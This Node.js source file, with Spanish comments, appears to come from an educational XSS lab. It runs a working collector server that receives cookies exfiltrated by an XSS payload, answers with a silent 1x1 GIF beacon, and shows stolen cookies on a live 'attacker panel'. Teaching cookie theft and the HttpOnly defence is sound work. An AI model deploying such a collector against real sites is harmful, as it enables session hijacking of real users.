// collector.js — Servidor colector del laboratorio educativo de XSS.
// USO LOCAL Y DIDÁCTICO (solo localhost). Forma parte de una demostración de
// cómo una vulnerabilidad XSS permite exfiltrar document.cookie, y de cómo la
// bandera HttpOnly lo evita. No se publica en internet.
//
// Corré:  node collector.js   y abrí http://localhost:4000
//
// Endpoints:
//   GET /collect?c=...  recibe la cookie que mandó el XSS de la app vulnerable
//   GET /events         stream SSE en vivo que alimenta el panel
//   GET /loot           historial en JSON
//   GET /               el panel que muestra lo recibido en vivo

const http = require("http");
const { URL } = require("url");

const loot = [];      // historial de cookies recibidas
const clients = [];   // conexiones SSE abiertas (los paneles en vivo)

// Empuja un evento a todos los paneles conectados
function broadcast(evento) {
  const data = `data: ${JSON.stringify(evento)}\n\n`;
  for (const res of clients) res.write(data);
}

const servidor = http.createServer((req, res) => {
  const url = new URL(req.url, "http://localhost:4000");

  // El app vulnerable corre en otro puerto (localhost:3000), así que
  // habilitamos CORS. En un lab local es aceptable; en producción jamás.
  res.setHeader("Access-Control-Allow-Origin", "*");

  // ---------------------------------------------------------------
  // Recibe la cookie exfiltrada por el XSS
  // ---------------------------------------------------------------
  if (url.pathname === "/collect") {
    const cookie = url.searchParams.get("c") || "";
    const evento = {
      cookie,
      origen: req.headers["referer"] || "desconocido",
      userAgent: req.headers["user-agent"] || "",
      hora: new Date().toISOString(),
    };
    loot.push(evento);
    broadcast(evento);
    console.log("[colector] cookie recibida:", cookie);

    // Respondemos un GIF transparente de 1x1 para que el "beacon" sea
    // silencioso: el navegador de la víctima cree que cargó una imagen.
    const gif = Buffer.from(
      "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
      "base64"
    );
    res.writeHead(200, { "Content-Type": "image/gif" });
    res.end(gif);
    return;
  }

  // ---------------------------------------------------------------
  // Stream en vivo (Server-Sent Events) que alimenta el panel
  // ---------------------------------------------------------------
  if (url.pathname === "/events") {
    res.writeHead(200, {
      "Content-Type": "text/event-stream",
      "Cache-Control": "no-cache",
      "Connection": "keep-alive",
    });
    res.write(":conectado\n\n");
    clients.push(res);
    req.on("close", () => {
      const i = clients.indexOf(res);
      if (i >= 0) clients.splice(i, 1);
    });
    return;
  }

  // ---------------------------------------------------------------
  // Historial en JSON
  // ---------------------------------------------------------------
  if (url.pathname === "/loot") {
    res.writeHead(200, { "Content-Type": "application/json; charset=utf-8" });
    res.end(JSON.stringify(loot, null, 2));
    return;
  }

  // ---------------------------------------------------------------
  // El panel en vivo
  // ---------------------------------------------------------------
  res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
  res.end(`<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<title>Panel del atacante — lab XSS</title>
<style>
  body { font-family: system-ui, sans-serif; margin: 0; background: #1a1a1a; color: #eee; }
  header { background: #7a1f1f; padding: 12px 20px; }
  header h1 { margin: 0; font-size: 18px; }
  header p { margin: 4px 0 0; font-size: 13px; opacity: .85; }
  .aviso { background: #3a2f00; color: #ffd; padding: 8px 20px; font-size: 13px; }
  main { padding: 20px; }
  .vacio { opacity: .5; font-style: italic; }
  .item { background: #262626; border-left: 4px solid #e24b4a; border-radius: 0 6px 6px 0; padding: 12px 16px; margin-bottom: 10px; }
  .item .hora { font-size: 12px; opacity: .6; }
  .item .cookie { font-family: monospace; font-size: 13px; word-break: break-all; margin: 6px 0; }
  .item .sid { color: #ff8a8a; }
  .item .meta { font-size: 12px; opacity: .6; }
</style>
</head>
<body>
<header>
  <h1>Panel del atacante</h1>
  <p>Cookies recibidas en vivo desde el XSS de la app vulnerable</p>
</header>
<div class="aviso">Laboratorio educativo · corre solo en localhost · demostración de XSS y de por qué sirve HttpOnly</div>
<main>
  <div id="lista"><p class="vacio">Esperando cookies… ejecutá el XSS en la app vulnerable.</p></div>
</main>
<script>
  const lista = document.getElementById("lista");
  let primero = true;

  function render(ev) {
    if (primero) { lista.innerHTML = ""; primero = false; }

    const item = document.createElement("div");
    item.className = "item";

    const hora = document.createElement("div");
    hora.className = "hora";
    hora.textContent = new Date(ev.hora).toLocaleTimeString();

    const cookie = document.createElement("div");
    cookie.className = "cookie";
    // Insertamos con textContent, NO innerHTML: el propio panel no debe ser
    // vulnerable a lo que le llega. Es parte de la lección.
    cookie.textContent = ev.cookie || "(cookie vacía — probablemente HttpOnly)";
    if (/sid=/.test(ev.cookie)) cookie.classList.add("sid");

    const meta = document.createElement("div");
    meta.className = "meta";
    meta.textContent = "origen: " + ev.origen;

    item.append(hora, cookie, meta);
    lista.prepend(item);
  }

  // Carga el historial y luego escucha en vivo
  fetch("/loot").then(r => r.json()).then(items => items.forEach(render));
  new EventSource("/events").onmessage = e => render(JSON.parse(e.data));
</script>
</body>
</html>`);
});

servidor.listen(4000, () => console.log("Colector en http://localhost:4000"));
